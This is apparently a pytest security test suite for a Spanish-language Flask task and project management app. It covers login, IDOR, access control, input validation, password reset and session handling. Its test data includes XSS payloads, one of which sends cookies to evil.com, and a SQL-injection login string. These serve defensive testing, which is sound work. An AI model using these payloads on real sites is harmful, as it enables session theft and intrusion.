import pytest
import datetime
from app import db
from app.database.models import User, Client, Collaborator, Project, Task, CollaboratorProject, PasswordResetToken
from flask import session


def _login(client, username='admin', password='admin123'):
    return client.post('/login', data={
        'identificador': username,
        'password': password
    }, follow_redirects=True)


def _create_admin(app):
    from app import bcrypt
    with app.app_context():
        if not User.query.filter_by(username='admin').first():
            admin = User(
                username='admin',
                password_hash=bcrypt.generate_password_hash('admin123').decode('utf-8'),
                role='admin',
                name='Admin Test',
                email='admin@test.com'
            )
            db.session.add(admin)
            db.session.commit()


def _create_regular_user(app):
    from app import bcrypt
    with app.app_context():
        if not User.query.filter_by(username='user1').first():
            user = User(
                username='user1',
                password_hash=bcrypt.generate_password_hash('user1234').decode('utf-8'),
                role='user',
                name='User Test',
                email='user1@test.com'
            )
            db.session.add(user)
            db.session.commit()


class TestAuthSecurity:

    def test_login_brute_force_no_rate_limit(self, app, client):
        _create_admin(app)
        for i in range(20):
            response = client.post('/login', data={
                'identificador': 'admin',
                'password': f'wrong{i}'
            })
            assert response.status_code == 200
        response = _login(client)
        assert response.status_code == 200

    def test_login_enumeration_same_message(self, app, client):
        _create_admin(app)
        resp_no_user = client.post('/login', data={
            'identificador': 'nonexistent',
            'password': 'whatever'
        })
        resp_bad_pass = client.post('/login', data={
            'identificador': 'admin',
            'password': 'wrongpassword'
        })
        assert b'Credenciales invalidas' in resp_no_user.data
        assert b'Credenciales invalidas' in resp_bad_pass.data

    def test_password_blocks_angle_brackets(self, app, client):
        response = client.post('/register', data={
            'nombre': 'Test User',
            'username': 'specialuser',
            'email': 'special@test.com',
            'password': 'Pass<word>',
            'confirm_password': 'Pass<word>'
        }, follow_redirects=True)
        assert b'caracteres no permitidos' in response.data

    def test_password_allows_safe_special_chars(self, app, client):
        response = client.post('/register', data={
            'nombre': 'Test User',
            'username': 'specialuser2',
            'email': 'special2@test.com',
            'password': 'P@ssw0rd!#$%',
            'confirm_password': 'P@ssw0rd!#$%'
        }, follow_redirects=True)
        assert b'Cuenta creada exitosamente' in response.data

    def test_register_password_min_length_only(self, app, client):
        response = client.post('/register', data={
            'nombre': 'Test User',
            'username': 'weakuser',
            'email': 'weak@test.com',
            'password': 'aaaaaaaa',
            'confirm_password': 'aaaaaaaa'
        }, follow_redirects=True)
        assert b'Cuenta creada exitosamente' in response.data

    def test_session_fixation_after_login(self, app, client):
        _create_admin(app)
        client.get('/login')
        with client.session_transaction() as sess:
            sess['pre_login_marker'] = 'test_value'
        _login(client)
        with client.session_transaction() as sess:
            assert 'pre_login_marker' in sess

    def test_no_csrf_protection_on_post(self, app, client):
        _create_admin(app)
        response = client.post('/login', data={
            'identificador': 'admin',
            'password': 'admin123'
        })
        assert response.status_code == 302


class TestIDOR:

    def test_user_can_change_other_users_task_status(self, app, client):
        _create_regular_user(app)
        with app.app_context():
            user = User.query.filter_by(username='user1').first()
            collab1 = Collaborator(name='Collab Owner', role='desarrollador', email='owner@test.com')
            collab2 = Collaborator(name='Collab Attacker', role='desarrollador', email='user1@test.com')
            db.session.add_all([collab1, collab2])
            db.session.flush()

            project = Project.query.filter_by(status='activo').first()
            task = Task(
                project_id=project.id,
                collaborator_id=collab1.id,
                title='Tarea privada',
                status='pendiente',
                due_date=datetime.date(2026, 6, 30)
            )
            db.session.add(task)
            db.session.commit()
            task_id = task.id

        client.post('/login', data={
            'identificador': 'user1',
            'password': 'user1234'
        })

        response = client.post(f'/mis-tareas/{task_id}', data={
            'status': 'completada'
        }, follow_redirects=True)
        with app.app_context():
            task = Task.query.get(task_id)
            assert task.status == 'pendiente', f'IDOR: task status changed to {task.status}'

    def test_mis_tareas_wrong_status_values(self, app, client):
        _create_regular_user(app)
        with app.app_context():
            user = User.query.filter_by(username='user1').first()
            collab = Collaborator.query.filter_by(email='user1@test.com').first()
            if not collab:
                collab = Collaborator(name='User Test', role='desarrollador', email='user1@test.com')
                db.session.add(collab)
                db.session.flush()
            project = Project.query.filter_by(status='activo').first()
            task = Task(
                project_id=project.id,
                collaborator_id=collab.id,
                title='Mi tarea',
                status='pendiente',
                due_date=datetime.date(2026, 6, 30)
            )
            db.session.add(task)
            db.session.commit()
            task_id = task.id

        client.post('/login', data={
            'identificador': 'user1',
            'password': 'user1234'
        })

        response = client.post(f'/mis-tareas/{task_id}', data={
            'status': 'en_progreso'
        }, follow_redirects=True)
        with app.app_context():
            task = Task.query.get(task_id)
            assert task.status == 'pendiente', \
                f'BUG: en_progreso is a valid task status but was rejected. Status is: {task.status}'


class TestAccessControl:

    def test_non_admin_access_to_clientes(self, app, client):
        _create_regular_user(app)
        client.post('/login', data={
            'identificador': 'user1',
            'password': 'user1234'
        })
        response = client.get('/clientes', follow_redirects=True)
        assert response.status_code == 200
        assert b'Acceso denegado' in response.data

    def test_non_admin_access_to_proyectos(self, app, client):
        _create_regular_user(app)
        client.post('/login', data={
            'identificador': 'user1',
            'password': 'user1234'
        })
        response = client.get('/proyectos')
        assert response.status_code == 302

    def test_unauthenticated_access_redirects(self, app, client):
        protected_routes = [
            '/dashboard', '/clientes', '/colaboradores',
            '/proyectos', '/tareas', '/asignaciones', '/reportes'
        ]
        for route in protected_routes:
            response = client.get(route)
            assert response.status_code == 302, f'{route} did not redirect unauthenticated user'

    def test_user_role_cannot_access_admin_routes(self, app, client):
        _create_regular_user(app)
        client.post('/login', data={
            'identificador': 'user1',
            'password': 'user1234'
        })
        admin_routes = ['/reportes', '/admin/check-overdue', '/admin/test-email']
        for route in admin_routes:
            response = client.get(route, follow_redirects=True)
            assert b'Acceso denegado' in response.data or response.status_code == 302, \
                f'User accessed admin route: {route}'


class TestInputValidation:

    def test_xss_in_task_title(self, app, client):
        _create_admin(app)
        _login(client)
        xss_payload = '<script>alert("xss")</script>'
        response = client.post('/tareas', data={
            'project_id': 1,
            'title': xss_payload,
            'description': 'test',
            'priority': 'media',
            'status': 'pendiente',
            'due_date': '2026-06-30'
        }, follow_redirects=True)
        assert b'no permitidos' in response.data, \
            'VULN: XSS payload in task title was not blocked by validation'

    def test_sql_injection_in_login(self, app, client):
        _create_admin(app)
        response = client.post('/login', data={
            'identificador': "admin' OR '1'='1",
            'password': "' OR '1'='1"
        }, follow_redirects=True)
        assert b'dashboard' not in response.data or b'Credenciales invalidas' in response.data

    def test_xss_in_client_name(self, app, client):
        _create_admin(app)
        _login(client)
        response = client.post('/clientes', data={
            'name': '<img src=x onerror=alert(1)>',
            'email': 'xss@test.com',
            'sector': 'Tecnologia',
            'phone': '3001234567',
            'contact_person': ''
        }, follow_redirects=True)
        assert response.status_code == 200

    def test_oversized_payload(self, app, client):
        _create_admin(app)
        _login(client)
        huge_string = 'A' * 10000
        response = client.post('/clientes', data={
            'name': huge_string,
            'email': 'huge@test.com',
            'sector': 'Tecnologia',
        }, follow_redirects=True)
        assert response.status_code == 200

    def test_description_no_sanitization(self, app, client):
        _create_admin(app)
        _login(client)
        malicious_desc = '<script>document.location="http://evil.com/steal?c="+document.cookie</script>'
        with app.app_context():
            project = Project.query.filter_by(status='activo').first()
            pid = project.id
        response = client.post('/tareas', data={
            'project_id': pid,
            'title': 'Tarea test XSS',
            'description': malicious_desc,
            'priority': 'media',
            'status': 'pendiente',
            'due_date': '2026-06-30'
        }, follow_redirects=True)
        with app.app_context():
            task = Task.query.filter_by(title='Tarea test XSS').first()
            if task:
                assert '<script>' in task.description, \
                    'VULN: Malicious script stored in task description without sanitization'


class TestPasswordReset:

    def test_reset_token_reuse(self, app, client):
        _create_admin(app)
        with app.app_context():
            user = User.query.filter_by(username='admin').first()
            import secrets
            token = secrets.token_urlsafe(24)
            expires_at = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=30)
            record = PasswordResetToken(user_id=user.id, token=token, expires_at=expires_at)
            db.session.add(record)
            db.session.commit()

        client.post(f'/reset-password/{token}', data={
            'password': 'newpassword123',
            'confirm_password': 'newpassword123'
        }, follow_redirects=True)

        response = client.post(f'/reset-password/{token}', data={
            'password': 'anotherpass123',
            'confirm_password': 'anotherpass123'
        }, follow_redirects=True)
        assert b'ya fue utilizado' in response.data or b'invalido' in response.data

    def test_reset_token_no_expiry_check_bypass(self, app, client):
        _create_admin(app)
        with app.app_context():
            user = User.query.filter_by(username='admin').first()
            import secrets
            token = secrets.token_urlsafe(24)
            expired_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=24)
            record = PasswordResetToken(user_id=user.id, token=token, expires_at=expired_time)
            db.session.add(record)
            db.session.commit()

        response = client.post(f'/reset-password/{token}', data={
            'password': 'hackedpass123',
            'confirm_password': 'hackedpass123'
        })
        assert response.status_code == 302, 'Expired token should redirect'
        with client.session_transaction() as sess:
            flashes = sess.get('_flashes', [])
            flash_messages = [f[1] for f in flashes]
            has_expiry_msg = any('expirado' in msg.lower() or 'invalido' in msg.lower() for msg in flash_messages)
            assert has_expiry_msg, f'BUG: Expired token was accepted. Flashes: {flash_messages}'

    def test_forgot_password_no_user_enumeration(self, app, client):
        _create_admin(app)
        resp_existing = client.post('/forgot-password', data={
            'email': 'admin@test.com'
        }, follow_redirects=True)
        resp_nonexistent = client.post('/forgot-password', data={
            'email': 'nonexistent@test.com'
        }, follow_redirects=True)
        assert b'Si el correo existe' in resp_existing.data
        assert b'Si el correo existe' in resp_nonexistent.data


class TestSessionSecurity:

    def test_session_persists_after_password_change(self, app, client):
        _create_admin(app)
        _login(client)
        with client.session_transaction() as sess:
            assert sess.get('user_id') is not None
        with app.app_context():
            user = User.query.filter_by(username='admin').first()
            from app import bcrypt
            user.password_hash = bcrypt.generate_password_hash('changedpass').decode('utf-8')
            db.session.commit()
        response = client.get('/dashboard')
        assert response.status_code == 200

    def test_logout_clears_session(self, app, client):
        _create_admin(app)
        _login(client)
        client.get('/logout')
        response = client.get('/dashboard')
        assert response.status_code == 302


class TestDataIntegrity:

    def test_delete_client_with_projects(self, app, client):
        _create_admin(app)
        _login(client)
        with app.app_context():
            client_obj = Client.query.first()
            client_id = client_obj.id
            has_projects = Project.query.filter_by(client_id=client_id).count() > 0
        if has_projects:
            response = client.post(f'/clientes/{client_id}', data={
                '_method': 'DELETE'
            }, follow_redirects=True)
            assert response.status_code == 200
            with app.app_context():
                still_exists = Client.query.get(client_id)
                assert still_exists is not None, 'BUG: Client was deleted despite having projects'
                projects_count = Project.query.filter_by(client_id=client_id).count()
                assert projects_count > 0, 'BUG: Projects were orphaned or deleted'

    def test_negative_project_dates(self, app, client):
        _create_admin(app)
        _login(client)
        response = client.post('/proyectos', data={
            'name': 'Negative Dates',
            'client_id': 1,
            'start_date': '2026-01-01',
            'end_date': '2025-12-31',
            'description': 'test',
            'status': 'planificacion'
        }, follow_redirects=True)
        assert b'posterior' in response.data or b'error' in response.data.lower()

    def test_task_due_date_after_project_end(self, app, client):
        _create_admin(app)
        _login(client)
        with app.app_context():
            project = Project.query.filter_by(status='activo').first()
            pid = project.id
            end = project.end_date
        response = client.post('/tareas', data={
            'project_id': pid,
            'title': 'Late task',
            'description': 'test',
            'priority': 'media',
            'status': 'pendiente',
            'due_date': (end + datetime.timedelta(days=30)).isoformat()
        }, follow_redirects=True)
        with app.app_context():
            late_task = Task.query.filter_by(title='Late task').first()
            assert late_task is None, 'BUG: Task created with due_date after project end_date'
